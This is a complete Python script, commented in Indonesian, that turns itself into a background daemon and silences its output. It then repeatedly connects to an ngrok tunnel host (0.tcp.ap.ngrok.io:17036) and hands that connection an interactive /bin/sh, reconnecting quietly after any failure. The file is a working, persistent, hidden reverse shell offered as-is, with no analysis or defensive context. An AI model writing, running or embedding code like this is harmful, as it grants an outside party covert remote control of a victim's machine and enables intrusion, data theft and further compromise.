#!/usr/bin/env python3
import socket
import os
import pty
import sys
import time
import signal
import atexit

def daemonize():
    """Fork process menjadi daemon"""
    try:
        pid = os.fork()
        if pid > 0:
            sys.exit(0)  # Exit parent
    except OSError as e:
        sys.stderr.write(f"Fork failed: {e}\n")
        sys.exit(1)
    
    # Detach dari terminal
    os.setsid()
    os.umask(0)
    
    # Fork kedua
    try:
        pid = os.fork()
        if pid > 0:
            sys.exit(0)
    except OSError as e:
        sys.stderr.write(f"Second fork failed: {e}\n")
        sys.exit(1)
    
    # Redirect stdio ke /dev/null
    sys.stdout.flush()
    sys.stderr.flush()
    si = open(os.devnull, 'r')
    so = open(os.devnull, 'a+')
    se = open(os.devnull, 'a+')
    
    os.dup2(si.fileno(), sys.stdin.fileno())
    os.dup2(so.fileno(), sys.stdout.fileno())
    os.dup2(se.fileno(), sys.stderr.fileno())

def reverse_shell():
    """Main reverse shell function dengan auto-reconnect"""
    HOST = "0.tcp.ap.ngrok.io"
    PORT = 17036
    RECONNECT_DELAY = 10
    
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(30)
            s.connect((HOST, PORT))
            
            # Duplikasi file descriptor
            os.dup2(s.fileno(), 0)
            os.dup2(s.fileno(), 1)
            os.dup2(s.fileno(), 2)
            
            # Spawn shell dengan PTY
            pty.spawn("/bin/sh")
            
            # Jika disconnect, close socket
            s.close()
            
        except (socket.error, OSError, KeyboardInterrupt) as e:
            # Silent fail, coba reconnect
            try:
                s.close()
            except:
                pass
            time.sleep(RECONNECT_DELAY)
            continue

if __name__ == "__main__":
    # Jadikan daemon
    daemonize()
    
    # Hilangkan parent process tracking
    signal.signal(signal.SIGHUP, signal.SIG_IGN)
    
    # Jalankan reverse shell
    reverse_shell()
